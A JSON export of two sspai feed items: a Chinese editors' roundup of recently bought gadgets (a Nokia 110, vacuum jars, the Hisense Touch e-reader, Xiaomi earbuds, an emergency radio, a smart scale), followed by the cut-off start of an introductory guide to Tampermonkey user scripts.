[{"title":"新玩意 077｜少数派的编辑们最近买了啥？","date":"2021-09-09 09:20:21","description":"\n<h4>关于栏目</h4>\n<p>很多读者都会好奇少数派的编辑们到底平时都「买了啥」。我们希望通过「编辑部的新玩意」介绍编辑部成员们最近在用的新奇产品，让他们自己来谈谈这些新玩意的使用体验究竟如何。</p>\n<hr>\n<h2>@张奕源 Nick：诺基亚 110</h2>\n<ul>\n<li>入手渠道：京东自购</li>\n<li>参考价格：249 元</li>\n</ul>\n<p>作为多卡一族，我有好几个历史遗留的 sim 卡用来接收短信。但在我一番电子设备大清理以后，手头已经没有合适的手机存放这些 sim 卡。刚好诺基亚推出了这款新品，我就买回来当个备机。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sskttb34td201m6070.jpeg\"></figure><p>看上 110 的主要原因是它的外形别致，黄色也蛮好看。在 110 之前，诺基亚已经推出了无数类似定位和功能的备用机，价格和外形大同小异。110 的键盘造型与侧面弧线让整机有了那么点「跑车味儿」，加上这个独特的黄色，足够在众多功能机里脱颖而出。</p>\n<p>诺基亚 110 的背盖采用了一种奇妙的网格工艺，我不太喜欢。网格摸起来手感很粗糙，而且还会带来不耐脏、易刮花等问题。不过鉴于它是个两百块的备用机，我对其做工自然没有太多苛责。但这个网纹明明可以不做，该设计也彰显了诺记吃力不讨好的冤大头作风。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ssku5b34td201m607g.jpeg\"></figure><p>和其它功能机相比，110 的特色是支援支付宝和喜马拉雅。其支付宝的使用方式和智能手环类似，需要支付宝主账号在别的手机上以扫码的方式绑定 110，之后就能在 110 上调出支付码了。这种支付方式也决定了它只可能作为年轻人的备用机——如果给家里的长辈使用，还需要另外一部登录了支付宝主账号的智能机，等于多此一举。</p>\n<p>另一个决定了其备用机地位的配置就是这款手机的萤幕。其萤幕尺寸仅有 1.8 英寸，分辨率为 QQVGA，就算设置为大字体，对老年人来说也不友好。不过，这款功能机有多语言支援，特别是能显示传统汉字，这对于我用来收验证码的香港卡来说很是实用。显示传统字这件事看似不大，但只要收到过两次全是小方块的短信，就能体会其中的蛋疼。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sskudb34td2ab6qam0.jpeg\"></figure><p>另外，这款手机还有一个摄像头，可以拍摄照片。成像质量相当梦幻，很难想象曾经的我们用这样的摄像头是怎么记录美好生活的。在 2021 年的今天，用这样一个摄像头拍照，倒是独有一番乐趣。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sskulb34td2ab6qamg.jpeg\"></figure><p>总体来说，诺基亚 110 是个挺不错的备用机，支援双卡双 4G 待机，各种手电筒、通话录音、单位换算器之类的小功能做得很完善，加上祖传的超长待机能力，收短信、打电话之类相当足够。如果有闲情逸致还能听听 FM 广播，玩一把贪吃蛇，在智能机时代回味一下曾经的玩机乐趣。</p>\n<h2>@Microhoo：bgest 真空保鲜罐</h2>\n<ul>\n<li>入手渠道：<a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/1y8w2b7e9ywao\" target=\"_blank\">少数派商店</a>\n</li>\n<li>价格：800ml×2 ￥199 <s>原价￥239</s> / 1100ml×2 ￥229 <s>原价￥259</s> / 4 件套￥379 <s>原价￥399</s>\n</li>\n</ul>\n<p>我在 <a href=\"https://sspai.com/post/65742\" target=\"_blank\">之前的文章里</a> 分享了一些导致食物变质的原因以及我在用的一些食品收纳容器，文中其实缺少一种我想很多人都非常熟悉的「真空储存」方案，当然不是因为这种方法不好，而是太麻烦。我其实有一台 BOSCH 的真空破壁机，我还另买了它配套的真空食品盒，也就是可以通过空气管链接两者将食品盒内抽成真空储存食物，可以大大延长食物的赏味期——非常好用，但是我想即便是看这短短的两句话你应该都会觉得非常麻烦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sskutb34td2engktq0.jpeg\"><figcaption>bgest 真空保鲜罐</figcaption></figure><p>好在无所不有的问路在知道我有用相关产品时，欣然寄了一套 bgest 真空保鲜罐给我，彻底刷新了我对真空储物罐的使用体验。从外表上来看，bgest 真空保鲜罐和普通的食品罐别无二致，就是盖子好像有点巨大，这是因为它的真空功能全部隐藏在了盖子里。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sskv5b34td27uspv8g.jpeg\"><figcaption>从上往下依次是释压键、电源键和磁吸充电口</figcaption></figure><p>相比市面上的大部分真空储物产品，bgest 真空保鲜罐既不用费劲的手动抽气，也不用翻箱倒柜的找空气管连接电动气泵抽气，取出食物时轻轻上掰一下正中心的释压口就可以轻松开盖，拿出之后盖会盖子按一下电源键便会开始抽出罐内空气并自动停止；而电源键下方的两个磁吸充电接口充满电后可以正常使用半年（官方的测试数据，当然具体续航取决于使用习惯）。我很想多讲一点什么，但是bgest 真空保鲜罐使用就是这么简单。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sskvlb34td2engktqg.jpeg\"><figcaption>瓶身是非常厚实的高硼硅玻璃</figcaption></figure><p>用料上盖儿部分使用的是 ABS 和食品级硅胶，而直接和食物接触的则是绝对安全无害的高硼硅玻璃，原则上你可以无忧存放液体或固体的任何事物。相比普通玻璃材质，高硼硅具有更好的耐热性，而且因为厚度可人，你甚至可以把它当作饭盒使用并能直接用于微波炉加热，瞬间就拥有了更多的使用场景。</p>\n<p>bgest 真空保鲜罐是一个很简单但极其实用的产品，但也是一个很难用太多文字去描述的产品，因为食品罐不稀奇，真空储存也不是啥了不起的黑科技——但看似简单的将两者结合在一起省时省力的设计，是我们生活向往舒适的巨大一步。</p>\n<h2>@老麦：小特车载充电器套装</h2>\n<ul>\n<li>入手：淘宝小特未来商店</li>\n<li>价格：268 元整套</li>\n</ul>\n<p>之前由于特斯拉车机导航的本土化做的不好，所以手机支架已经成了必备配件，但特斯拉的隐藏式空调口，让大部分支架都没法兼容。看了一圈各种定制产品，我还是觉得小特叔叔家的 OBD 车载支架最为完美，但因为安装上有一点门槛，所以很多用户都不太知道。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sskvtb34td2engktr0.jpeg\"></figure><p>支架的位置设计很有学问，特斯拉本来就是极简中控，如果中间搞个复杂支架放那，实在是违和，而老马苦心设计的开阔视野，视线也会被手机遮挡。小特的支架选择贴合在左侧的空调口边缘，手机刚好放在 A 柱范围内，没有遮挡任何视野，高度也刚刚好，看导航不需要刻意的抬头和低头。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ssl05b34td2engktrg.jpeg\"></figure><p>为了让支架更隐形，根据空调口位置进行了专门的开模，底座就完美贴合在中控上，同时不遮挡空调出风，又能保证一定的散热效果。而走线则完全隐藏在侧面的内饰版里面，只有俯身到方向盘下面才会看到 OBD 接口，整体设计非常完美。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/12dd14235ab133776b3c7ead56ce86e8.png\"></figure><p>同时，因为支架球头部分是通用的，所以你可以后期自己换各种充电器，可以是 MagSafe 磁吸，也可以买小米华为那种自动托盘的，还可以选下图这种 PITAKA 专用的磁吸壳和配套车载充电器，因为两边都有加强磁力，要去路况颠簸的地方，会更加安全稳妥。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/a01f196b9077c24e8863b3b8226a4f80.png\"></figure><p>其实经过几个版本更新之后，特斯拉车机地图已经好用很多了，但确实也没法跟更熟悉本地情况的百度和高德相比，所以手机辅助还是有必要的。目前为止，小特这个套装产品还是一步到位的最佳选择。</p>\n<h2>@PlatyHsu：海信 Touch</h2>\n<p>iPod touch 是我最喜欢的电子产品之一。它寄居在手机的外壳中，让人用相对较低的成本体验到不输「完全体」的功能；虽然刨去了通讯模块，但对于已经不再需要另一台手机的用户而言，反倒也算一种优点而非缺陷。</p>\n<p>在 iPod touch 久未更新、行将就木之际，我又迎来了另一台名为「touch」的产品——海信 Touch。这是海信在推出数代墨水屏（E-Ink）手机后，发布的一款不带通讯功能的纯阅读器产品。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ssl1lb34td2ab6qan0.jpeg\"></figure><p>每台墨水屏产品都不可避免地要面对「买来干什么」的灵魂拷问。对此，海信 Touch 的答案大概会是<strong>「打不过就加入」</strong>：既然动不动就刷手机的习惯难以克服，那至少让自己的眼睛得到保护。要做到这点，替代品的尺寸、功能越接近正常手机，「欺骗」效果就越好。因此，海信 Touch 这种四舍五入就是个手机的阅读器，就成了当仁不让的选择。</p>\n<p>当然，市面上已经有了不少小尺寸墨水屏 Android 设备，除了海信自家的 A 系列手机，还有来自掌阅、口袋阅、墨案的可选。与它们相比，必须指出海信 Touch 的墨水屏素质只是中游水平：屏幕尺寸为 5.84 寸、分辨率为 1440 × 720 像素，像素密度为 276 ppi，比市面上其他墨水屏设备主流的约 300 ppi 左右略低。实际使用中，这项参数的劣势是可感知的；好在单色文字阅读的使用场景使然，对使用体验的影响不大。</p>\n<p>但除此之外，海信 Touch 的硬件其实亮点颇多：</p>\n<ul>\n<li>设计上：深绿色外壳（官方称为「黛青」，亦有「羽灰」）可选）配以亮橙色腰线点缀，且使用电纸书中少见的铝制机身，在质感上与中高端手机看齐。同时，7 毫米厚度、155 克重量、窄边框这些轻薄特质，也确保了优秀的手感。</li>\n<li>基础参数上：海信 Touch 使用高通骁龙 460 处理器（11 nm 制程、大小核设计）、4GB RAM，属于按手机标准惨不忍睹、按电子书标准鹤立鸡群的水平；128GB 的存储空间也足够慷慨。</li>\n</ul>\n<p>此外，继承同品牌墨水屏产品的家学渊源，海信 Touch 也内置了素质高于常规设计的解码、运放芯片和扬声器。但我并非专业发烧友，日常听歌场景也出于偷懒心理、越发以使用无线耳机为主，这个卖点对我的吸引力和实际意义有限。只能从主观角度作证耳塞（AKG N5005）直推的表现明显好于 iPhone 加官方转接线。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ssl2db34td201m6090.jpeg\"></figure><p>软件上看，海信 Touch 使用了比较新的 Android 11 作为底层系统。但是，墨水屏设备并不只是装上 Android 系统就能点石成金；定制化功能和针对性优化的重要性不可忽视。从这个角度看，海信系统给我留下了不错的第一印象。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ssl2tb34td27uspv90.jpeg\"></figure><p>系统界面：启动器（第三方 Niagara）、通知中心、设置</p>\n<p>通过目前一段时间的使用，我主要发现的亮点包括：</p>\n<ul>\n<li>屏幕刷新率设置灵活：与我此前熟悉的文石系统类似，海信也提供清晰、均衡、平滑和极速多个屏显模式可选，其刷新率由慢而快，但残影现象相应由弱渐强。此外，海信系统的两个优秀细节在于，不仅可以在打开 app 后单独设置刷新率，还提供了专门的管理界面和批量设置的选项；同时，即使选择慢速刷新（显示质量优先），也可以在检测到滚屏操作时自动切换到高一档的刷新率，减少「幻灯片」效果。</li>\n<li>手势操作便捷：支持基本的全面屏手势——底部左中右边缘上划，分别对应返回、主页和多任务切换；也内置了悬浮球功能作为另一种导航方式。</li>\n<li>提供可定制功能的侧键：海信 Touch 机身左侧有一颗额外物理按键，系统设置中可以将该按键的单击、双击操作分别绑定到快捷方式、启动 app 等操作；对于阅读场景特别实用的包括模拟翻页、手动刷新屏幕和跳转到词典应用等。长按操作则固定为「闪念胶囊」功能，我发现特别适合用来做摘录：复制一段重点后，长按侧键唤出笔记，粘贴后按返回即可继续阅读。</li>\n</ul>\n<p>此外，由于海信 Touch 的系统与其手机产品大致相同，国产手机中常见的权限管理、后台冻结、空间清理、字体更换、锁屏布局等辅助或个性化功能也一应俱全。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4ssl35b34td2ab6qang.jpeg\"></figure><p>特色功能：闪念胶囊、悬浮球、锁屏时钟</p>\n<p>但与此同时，海信系统的缺点也非常明显：</p>\n<ul>\n<li>不支持 Google 框架：与文石系统默认禁用 Google 框架、但可以手动开启不同，海信系统完全去除了 Google 框架，且客服在官方论坛中明确表示不会提供开启方式。因此，海信 Touch 上安装 app 只能自食其力。（固然有自带的应用市场，但打开只坚持了五秒就被广告吓跑了。）好在我在这台设备上用到的 app 以开源或免费的为主，大多可以通过 F-Droid、APKPure 等第三方应用商店解决。</li>\n<li>充斥大量广告：除了上面提到的应用市场，阅读、浏览器、天气这些内置应用中也充满了「牛皮癣」。虽然平心而论，海信系统中的广告密度与其他国产厂商相比已经算是收敛，且大多数可以关闭；但考虑到「阅读器」的产品定位，我仍然认为这么做是不够光彩的。</li>\n</ul>\n<p>（还有一个不算缺点的缺点：海信系统的英文界面实在是太魔性了。我第一次探索设置界面花了快一个小时，因为每点开一屏都想打滚笑一分钟。）</p>\n<p>附上我目前在海信 Touch 上的应用选择供参考：</p>\n<ul>\n<li>阅读器：KOReader。Linux/Android 设备阅读器的无冕之王。</li>\n<li>浏览器：Iceraven。这是一个基于 Firefox 但去除遥测功能、恢复插件安装能力的 fork 版。一些有助于墨水屏网页阅读体验的插件包括：</li>\n</ul>\n<ol>\n<li>uBlock Origin：广告屏蔽插件。</li>\n<li>Stylus：自定义 CSS。</li>\n<li>Dark Reader：本职功能为开启黑暗模式，但由于支持调整对比度，在墨水屏设备上可以活用为网页「漂白」插件。</li>\n</ol>\n<ul>\n<li>启动器：Niagara。简洁轻量，文字为主的布局也特别适合墨水屏。</li>\n<li>稍后读：Instapaper。同类产品 Pocket 亦运行良好。</li>\n<li>RSS：NewsBlur。Inoreader、Feedly 等常见服务客户端亦运行良好。</li>\n<li>文件管理：Solid Explorer。除了基础文件管理外，还提供了连接第三方云存储（方便访问 OneDrive 和 Dropbox 中的资源）、FTP 服务器（便于免数据线传输）等实用功能。</li>\n</ul>\n<p>最后简单说说选购建议：原价为 1600 元，个人认为存在品牌或概念等因素造成的溢价，根据此类产品销售规律，后期应有降价空间。如果需要近期入手，不妨多蹲一蹲那家知名海鲜市场——要相信吃完泡面的人总比想吃泡面的人多。</p>\n<h2>@aiokr：小米 FlipBuds Pro 降噪耳机</h2>\n<ul>\n<li>购入渠道：小米京东自营旗舰店</li>\n<li>购入价格：789 元</li>\n</ul>\n<p>首先吐槽一下，这个耳机的英文名称每次念出来都感觉在喷口水^_☆</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/c6a75882c5510d36dbce0ec5f95304e4.jpg\"><figcaption>耳机盒本体</figcaption></figure><p>自从在 BOSE 的体验店里第一次体验到降噪耳机的神奇之处后，就有种「回不去了」的感觉。加上这两个学期课程变少，在宿舍和工作室里看书写作业的时间变多了，对降噪耳机的需求就愈发增大。看了一大圈测评之后，最后就在 AirPods Pro 和小米 FlipBuds Pro 之 间纠结。</p>\n<p>不过一个 AirPods Pro 可以买两个小米的 FlipBuds Pro 了，而且看测评它们两之间的降噪水平差不多，我也数次前往小米之家体验这款耳机，没有出现网上评论经常说的「戴不稳」、「容易掉」的问题，于是就下单购买了小米 FlipBuds Pro。</p>\n<p>降噪能力上，入耳式的降噪耳机还是不比耳罩，不过敲键盘的声音、饮水机、风扇和空调运转的声音能够几乎消掉，说话的声音也能消掉大部分，在家里关上门窗之后也听不到楼下广场舞的低音炮，我对它的降噪能力就已经非常满足了。</p>\n<p>延迟上，没有实际地测试过，不过放视频是不会有太影响体验的延迟的，打游戏的话，音游不太合适，原神没什么大问题。</p>\n<p>外观上，形似鹅卵石的外壳和小米的新 LOGO 有异曲同工之妙，反正拿在手里感觉挺不错的。光面的外壳很容易沾染指纹，磨损之后也不好看，所以我就给他配了一个硅胶套==。</p>\n<p>软件方面，如果有升级到最近几个版本 MIUI 的小米/红米手机，在首次配对及后续使用中，可以直接通过弹窗显示耳机电量，与小米之前的耳机不同的是，FlipBuds Pro 可以直接在系统设置的蓝牙里对耳机进行设置，而不必使用小爱同学 App。但如果是其他的 Android 手机，还是需要下载小爱同学 App 来进行设置，iOS 的小爱同学则不支持设置这款耳机。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/19e21ce90a64ee834c58842ee78f999b.jpg\"><figcaption>MIUI 系统中的弹窗</figcaption></figure><p>最后吐槽一下不太方便的地方，两个耳机在耳机盒里是「背对背」放置的，每次拿出耳机都要在手上转一下才能带到耳朵里。然后可能受充电和体积限制，无线充电的线圈比较小，放在充电板上需要仔细地放在中间才能充电。其次，目前为止小米还没有给这款耳机推送抗风噪的功能，带着跑步骑车就不能打开降噪了。最后，降噪模式下的耳压感比较强，如果平时容易晕车或者 3D 眩晕的话，坐公交这种比较摇晃的场景下开降噪，可能会有些头晕。</p>\n<h2>@Luckyle：Combat 2000「长舌包」 </h2>\n<ul>\n<li>入手渠道：淘宝自购</li>\n<li>参考价格：121 元</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/49bb269c0b1c5ea2f8bd8d3574f012e5.JPG\"><figcaption>小巧玲珑，一手掌握</figcaption></figure><p>前阵子经过台风袭击后，觉得有必要配置下个人医疗包（Individual First Aid Kit）或者叫单兵急救包，以备不时之需。考虑以下几点：</p>\n<ul>\n<li>体积要 4L 以下（方便携带）</li>\n<li>Molle 系统（装具模块化系统）</li>\n<li>外壳防水</li>\n<li>多夹层设计</li>\n<li>最好有磁铁快拆设计（看起来酷一点）</li>\n</ul>\n<p>最重要是颜值能打，要有趣！</p>\n<p>我几乎看遍了国内外所有品牌，从传统战术厂商塔虎、5.11 看到国内新潮品牌狐蝠工业再到户外品牌神秘农场，千挑万选，或多或少有种种不足。后来看到这款国产 <strong>Combat 2000 的「长舌包」</strong>，第一眼觉得挺有趣，拉开拉链就像吐出的长舌头。这款包似乎是有原型，虽然我没有找到原版，但肯定有复刻的成分。价格很便宜，一百块出头，颜色很多，有灰色、黑色、狼棕色、游骑兵绿、multicam（多地形迷彩）。选择犹豫症犯了，最后选择不会出错的黑色，毕竟年轻人要低调点（狗头）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/2474c49ce8dbf3f33ba9f2913009ad51.JPG\"></figure><p>这个包的精髓就是在闭合状态下，只需要扯下 D 型拉环就可以快速打开，包体里面的物件一览无余，快速取物，符合急救包的使用场景。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/16354ecd2fe60da2b5996c1d64766df7.JPG\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/05/641fe1a84fdaa9ffe340b0b98a66a783.JPG\"></figure><p>包身采用杜邦考杜拉面料，医疗包标配；特氟龙防泼水；顶部魔术贴面可以粘上喜欢的士气章，增添玩趣。可以搭配肩带斜挎携带。背部 Molle 系统可以挂在主包上，不怕少带一个包。</p>\n<p>总体来说是个性价比非常不错的小包，虽然没有磁铁快拆（也只有在狐蝠工业看到过），不会过于硬核，有 urban outdoor 风格。入门之选，买一个来把玩，关键时候还能派上大用场。</p>\n<h2>@刀客特Leslie：多功能防灾手摇发电手电筒收音机 </h2>\n<ul>\n<li>入手渠道：淘宝</li>\n<li>价格：141.15（叠加多种优惠后）</li>\n</ul>\n<p>在郑州暴雨消息牵动全网的心的第二天，看着台风烟花的汹汹来势，我立刻就下单买了这个国家应急物资储备推荐的多功能手电筒收音机（以及救生衣、保温毯……）。</p>\n<p>选购时需满足的核心需求是：</p>\n<ul>\n<li>能作为手电提供照明，可以很好地接收收音机信号。</li>\n<li>支持多种形式充电，USB 线充电、太阳能充电和手摇发电，最好支持干电池供电。</li>\n<li>能给手机充电。</li>\n</ul>\n<p>至于其他的功能例如 SOS 警报、支持耳机、开瓶器什么的倒是添头了。外观我选择了最朴实无华的黑色款，到手的尺寸有点像爱遛弯儿的老头手腕上挂着的那种嗓门特别大的收音机。</p>\n<p>正面的按钮是收音机开关、调节音量和频道的案件，LCD 屏幕显示波段和电量，可以选择背光是否打开。不知道为啥右边背部的天线让我感到一股蠢萌感，在不把天线拉开的条件下，室内也可以较好地收到电台信号，好久没用过收音机再听到久违的雪花声有一种回忆的复古感，脑中开始播放各种末日电影的场景。搜寻电台只能使用上下键，但长按可以快速定位到有信号的相邻电台波段，也算方便。支持的波段是 FM 87-108MHZ 及 AM 520-1710KHZ，满电状态可用 20 小时的收音机。</p>\n<p>正面左下角还有一个 SOS 警报键，长按 3 秒后会发出 70 分贝以上的警报，并且手电筒开始频闪，短按后可关闭，这个功能比较适合在救援人员接近时起到呼救、指示方位的作用。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/04/672fc4e6fc4c066cdfe298e0e033354d.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/04/195e628b64b88f5f1b19c56b58819050.jpeg\" alt=\"\"></figure><p>机器顶上有太阳能充电板，参数是 5.5V，30mA，这个我尚未拿到 8 月正午的阳光下试过。右侧是 USB 输出、一个 microUSB  的输入端（没有 typeC，看来逃命时还得备齐电源线🙃）和一个 3.5mm 耳机孔。商品介绍说锂电池的容量是 2000mA，USB 线充电需 3 小时充满。下面是个开瓶器，<s>想一想在末日逃生的途中开一瓶玻璃瓶装的可乐应该很爽吧，</s>还有一个登山扣，方便把这个不小的家伙挂在逃生背包上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/823d8f5a5152caa566ca931ddcee44ac.jpeg\"><figcaption>为了这开瓶器我可得装一个玻璃瓶装可乐到我的逃生背包中呢🙃</figcaption></figure><p>左侧是手电筒，LED 灯珠，亮度为 70 流明，据介绍寿命可达 1 万小时，上方是开关，不过只有一个档位，摁一下打开，再按关闭。电量充足时可连续照明 8 小时。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/ae2ee04c3ad869e5602b35565f0130ef.jpeg\"></figure><p>背后有个手摇柄，据说手摇 1 分钟可以照明 30 分钟，实测了一下手摇不太快而且没一会儿手就会累了，我还是选择多备几节干电池好了🙃，需要装 3 节 7 号电池在下方的电池槽中。</p>\n<p>在没有任何危机的现实城市生活中，这个新玩意儿就像个怀旧的玩具一样。但气候变化带来了越来越频繁且难以预测的极端恶劣天气，我们有时候真的不知道明天和意外哪个会先来。郑州地铁 5 号线遇难者的家属肯定也没想到，不过是一个平凡的工作日，怎么就成了天人相隔的一天。我会好好地把这个收音机连同好多节干电池、压缩饼干、午餐肉、保温毯、求生哨一起塞进一个大大的双肩包里，然后祈求我有足够的幸运余生都不用把它们拿出来。也希望你和我一样，不忘记潜在的意外和危险，有备，才无患。</p>\n<h2>@青苗法鸣：Withings Body+ 体重秤</h2>\n<ul>\n<li>入手渠道：淘宝</li>\n<li>参考价格：369 元（二手样机）</li>\n</ul>\n<p>工作后体重飙升，便准备入手一台体重秤<s>控制一下体重</s>。本科入学时添置的云麦体重秤随着我体重的增加，广告也日益增多。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/07/d009bc650fa6d46206c7665c59d4d9c0.jpg\"><figcaption>开屏广告 | 发现页 | 商城页</figcaption></figure><p>由于我仅仅是想要长期观察一下体重趋势，并没有观看广告的需求。遂果断决定重新购买一台体重秤，要求只有一点，App 内没有任何广告即可。</p>\n<p>询问了十余家体重秤的网店客服，最后发现能做到 App 内无广告的厂家可能只有三位：欧姆龙、Garmin 和 Withings。虽然有在用 Garmin 的手环，但它的体重秤售价实在太高，下不去手。与欧姆龙相比，Withings 的 App 更美观，且这款体重秤上还有 Nokia 的标识，就决定买它了。</p>\n<figure class=\"ss-imgRows\" figcaption=\"Withings Health Mate | 欧姆龙\"><img src=\"https://cdn.sspai.com/2021/08/07/7aa4d90845c5813af635805a8d17ccaf.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/07/b6b32c6353682efcf8cdb24698c03075.png\" alt=\"\"></figure><p>体重秤本身倒也没有什么特别出彩的地方，常规设计，甚至还被云麦的创始人发微博吐槽过内部结构上「态度截然不同」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/07/article/82f6a83c9e07d6b04208bca2e7df5c70\"></figure><p>但对我来说，相比于云麦 App 带来的精神污染，内部结构真不是事。如果云麦也能有一款纯净的 App，那我一定第一个支持，价格翻几番都没问题。</p>\n<figure class=\"ss-imgRows\" figcaption=\"Withings Body+ 体重秤\"><img src=\"https://cdn.sspai.com/2021/08/11/17469d09af5c6760db2c99de1a2a7973.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/11/7575cd609db24ea6b6efd0c658be1023.jpg\" alt=\"\"></figure><p>相比国产体重秤，Withings Body+ 的优势在于硬件能满足我基本需求的同时，有非常好的软件体验，但也有一些不足之处。如果你很介意的话，那么这款产品可能并不适合你：</p>\n<ul>\n<li>手机初次连接体重秤异常繁琐复杂，且速度较慢，好在界面赏心悦目。</li>\n<li>初次连接成功后，倘若将体重秤长距离移动，则可能需要与手机重新连接一次。</li>\n<li>称重后，数据同步至手机可能需要 2-5 分钟，甚至有时需要在手机 App 内下拉刷新才显示最新数据。不像云麦的体重秤，手机甚至可以在称重时同步显示数据的变化。刚开始使用可能会担心数据是否会同步上，但其实并不用担心，每次连接上手机，都会一并同步之前尚未同步的称重数据。</li>\n<li>App 内虽然无广告，但可自定义程度仍然较低，不能按照自己的需要删掉不想要的模块。也存在类似于「今日步数」这类无法删除的牛皮癣。</li>\n<li>体重数据只能选择公斤，没有「斤」这个单位。</li>\n<li>目前国内在售的 Withings 体重秤，不是二手就是库存货，基本是不存在售后与质保的，不过我并不在意这一点，能把体重秤用坏的概率极低。</li>\n</ul>\n<p>同时，在 App 的各个小角落，会有对用户可能关心问题的解答，并且是没有任何广告引流的哦。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/11/59a8993b38cfbcd9da82efc889520630.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/11/2c1c3a241ee0cd6d5b634280a5bd396f.png\" alt=\"\"></figure><p>体重秤对于我来说，只是一个测量体重，并观察其趋势的工具。类似于脂肪、肌肉、蛋白质、骨量这些数据，我不相信准确性，也并不需要。</p>\n<p>倘若你也有类似的需求，但觉得没有广告的代价有些高昂，可以选择让自带的健康 App 读取你所购买品牌体重秤 App 的数据，也可以达到避免视觉污染的效果。</p>\n<h2>彩蛋</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/8f601c5d59c90053430c97dfbf715c1f.gif\"></figure><p>今晨收到了贵阳同事寄来的两盒「省医月饼」，一看外包装是食堂出品还有点惊讶，不过似乎是通过盒马买到的正品。云腿月饼咸香无比，几口就没有了。老麦的原话是「吃了一个还想吃下一个。」</p>\n<p>和这位热忱可爱善良的同事商量了一下，提前祝《新玩意》栏目的读者们中秋快乐。不过更值得关注的是下一句话：<strong>充电转发留言评论本文，抽一位幸运读者送出这份美味的云腿月饼。</strong></p>\n<p><strong>如果你也想分享「新玩意」🔉：</strong></p>\n<p>很多读者表示自己也有一些希望分享的有趣产品。为了能让更多读者参与，我们决定在「新玩意」栏目最后添加一个新的版块，邀请大家来 Matrix 社区发表文章分享你的「新玩意」，你只需要：</p>\n<ul>\n<li>在标题中标注「新玩意」</li>\n<li>用 500-1000 字介绍产品</li>\n<li>配上 1-2 张产品的实拍图片</li>\n<li><strong>在网站个人信息中补充支付宝账号</strong></li>\n</ul>\n<p>成功入选栏目还可以得到 108 元的「剁手抚恤金」🧧。如果你有兴趣参与，就赶紧来稿吧！</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a> ，了解更多的新玩意 🆒</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派sspai官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68675"},{"title":"油猴使用指南 01：传说中的「油猴」与用户脚本","date":"2021-09-09 08:00:00","description":"\n<p>前一段时间在作者群里大家讨论，萌生了写个油猴脚本的想法，主要作用是给页面上增加一些好玩的功能。在写脚本的过程中，重新整理了一些关于油猴脚本的信息，也就有了本文。</p>\n<h2>油猴脚本：是什么、能干嘛？</h2>\n<p>油猴脚本，正式的叫法是用户脚本（user script）。之所以叫做「油猴」，是因为第一个制作这个浏览器扩展的作者 Aaron Boodman 起名叫做 Greasymonkey，中文直译就是「油腻的猴子」；后面其他脚本开发的时候，基本都在沿用 Greasymonkey 的一些基本规范，这些脚本也就统称为「油猴脚本」了。</p>\n<p>本文后续还是会采用本名「用户脚本」。</p>\n<p><strong>你可以将用户脚本理解为一种可以根据我们的实际需求，为网页「加料」的手段</strong>。如果你之前从来没有使用过用户脚本又想体验一下的话，可以按照以下步骤操作来快速感受一下它的魅力：</p>\n<ol>\n<li>下载浏览器扩展，绝大部分情况下我都推荐Tampermonkey，根据你使用的浏览器， 可以访问并安装：<ol>\n<li><a href=\"https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo\" target=\"_blank\">Chrome-Tampermonkey</a></li>\n<li><a href=\"https://addons.mozilla.org/firefox/addon/tampermonkey/\" target=\"_blank\">Firefox-Tampermonkey</a></li>\n<li><a 